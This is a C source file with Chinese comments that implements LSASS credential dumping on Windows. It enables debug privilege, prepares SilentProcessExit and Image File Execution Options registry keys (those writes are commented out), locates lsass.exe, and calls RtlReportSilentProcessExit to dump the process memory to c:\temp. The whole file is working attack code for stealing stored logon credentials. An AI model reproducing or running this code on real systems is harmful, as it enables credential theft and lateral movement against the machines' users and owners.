
#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>
#define SavePath L"c:\\temp"

//获取lsass进程pid
DWORD FindProcessId() {
    PROCESSENTRY32 processInfo;
    processInfo.dwSize = sizeof(PROCESSENTRY32);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }
    if (Process32First(snapshot, &processInfo)) {
        do {
            if (!_wcsicmp(L"lsass.exe", processInfo.szExeFile)) {
                CloseHandle(snapshot);
                return processInfo.th32ProcessID;
            }
        } while (Process32Next(snapshot, &processInfo));
    }
    CloseHandle(snapshot);
    return 0;
}

//修改注册表
int regedit() {
    HKEY hKey;
    LONG result;
    //创建并打开 "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe" 子键
    /*
    result = RegCreateKeyEx(
        HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\lsass.exe",
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_WRITE,
        NULL,
        &hKey,
        NULL
    );*/
    //添加 DumpType 类型为 REG_DWORD 的内容，数据为0x2
    DWORD dumpTypeValue = 0x02;
    //result = RegSetValueEx(hKey, L"DumpType", 0, REG_DWORD, (const BYTE*)&dumpTypeValue, sizeof(DWORD));
    //添加 LocalDumpFolder 类型为 REG_SZ 的内容，数据为 c:\temp（SavePath）
    //result |= RegSetValueEx(hKey, L"LocalDumpFolder", 0, REG_SZ, (const BYTE*)SavePath, sizeof(SavePath));
    //添加 ReportingMode 类型为 REG_DWORD 的内容，数据为0x2
    DWORD reportingModeValue = 0x02;
    //result |= RegSetValueEx(hKey, L"ReportingMode", 0, REG_DWORD, (const BYTE*)&reportingModeValue, sizeof(DWORD));
    RegCloseKey(hKey);

    //创建并打开 "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lsass.exe" 子键
    /*
    result = RegCreateKeyEx(
        HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\lsass.exe",
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_WRITE,
        NULL,
        &hKey,
        NULL
    );*/
    //添加 GlobalFlag 类型为 REG_DWORD 的内容，数据为0x200
    DWORD globalFlagValue = 0x200;
    //result = RegSetValueEx(hKey, L"GlobalFlag", 0, REG_DWORD, (const BYTE*)&globalFlagValue, sizeof(DWORD));
    RegCloseKey(hKey);
    return 0;
}

// 启用调试权限
void DebugPrivilege() {
    //打开进程访问令牌
    HANDLE hProcessToken = NULL;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hProcessToken);
    //取得SeDebugPrivilege特权的LUID值
    LUID luid;
    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);
    //调整访问令牌特权
    TOKEN_PRIVILEGES token;
    token.PrivilegeCount = 1;
    token.Privileges[0].Luid = luid;
    token.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    //获取debug特权
    AdjustTokenPrivileges(hProcessToken, FALSE, &token, 0, NULL, NULL);
    CloseHandle(hProcessToken);
}

int main() {
    //提升令牌访问权限
    DebugPrivilege();

    //设置注册表
    regedit();

    //获取lsass进程pid
    DWORD processId = FindProcessId();

    //获取lsass句柄
    HANDLE hProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, processId);
    if (hProcess == INVALID_HANDLE_VALUE) {
        printf("OpenProcess() --err: %d\n", GetLastError());
    }

    //从ntdll中取RtlReportSilentProcessExit函数
    typedef NTSTATUS(NTAPI* RtlReportSilentProcessExit)(
        HANDLE processHandle,
        NTSTATUS ExitStatus
        );
    HMODULE hModule = GetModuleHandle(L"ntdll.dll");
    RtlReportSilentProcessExit fRtlReportSilentProcessExit = (RtlReportSilentProcessExit)GetProcAddress(hModule, "RtlReportSilentProcessExit");
    //静默退出lsass
    NTSTATUS s = fRtlReportSilentProcessExit(hProcess, 0);
    if (s == 0) {
        printf("内存转储成功，保存路径：%S", SavePath);
    }
    CloseHandle(hProcess);
    CloseHandle(hModule);
}